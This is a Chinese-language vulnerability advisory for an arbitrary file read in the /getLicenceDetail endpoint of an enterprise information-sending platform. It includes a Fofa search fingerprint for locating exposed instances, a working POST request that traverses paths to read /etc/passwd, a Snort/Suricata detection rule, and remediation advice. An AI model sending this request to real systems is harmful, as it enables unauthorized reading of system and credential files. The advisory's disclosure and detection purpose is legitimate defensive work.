# 企业信息发送平台 getLicenceDetail 存在任意文件读取漏洞

企业信息发送平台 getLicenceDetail 存在任意文件读取漏洞

# 影响版本

**目前现有版本**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **fid=&quot;G+ad9wy/zlkrmbSKJo9x+Q==&quot;**

**POC/EXP：**

**step1** **任意文件读取**

```
POST /getLicenceDetail HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
X-Access-Token: undefined
X-Access-SessionId: undefined
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36

fileName=../../../../../../etc/passwd
```

​![image](assets/image-20260902002601-iq0zfmy.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"企业信息发送平台 - /getLicenceDetail 任意文件读取漏洞 (Path Traversal)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/getLicenceDetail"; fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"fileName="; nocase;
    http.request_body; pcre:"/fileName\s*=\s*[^&]*?(?:\.\./|\.\.\\|/etc/|c:)/i";
    metadata:
        service http,
        affected_product "企业信息发送平台",
        vulnerability_type "Arbitrary File Read",
        severity "high";
    classtype:web-application-attack;
    sid:1000751;
    rev:1;
    priority:2;
)
```

# 漏洞修复

1. **联系厂商**：尝试联系平台开发商获取安全补丁或升级版本。
2. **部署WAF规则**：在Web应用防火墙（WAF）上配置规则，**拦截对**  **​`/getLicenceDetail`​**​ **接口的异常请求**，特别是 `fileName`​ 参数中包含 `../`​、`..;`​ 等目录遍历特征的请求。
3. **网络访问控制**：通过防火墙策略，**限制该系统仅允许内网或特定可信IP访问**，避免直接暴露在公网。
4. **加强监控审计**：**检查系统访问日志**，重点排查对 `/getLicenceDetail`​ 接口的可疑访问，尤其是包含路径遍历序列的请求。

‍
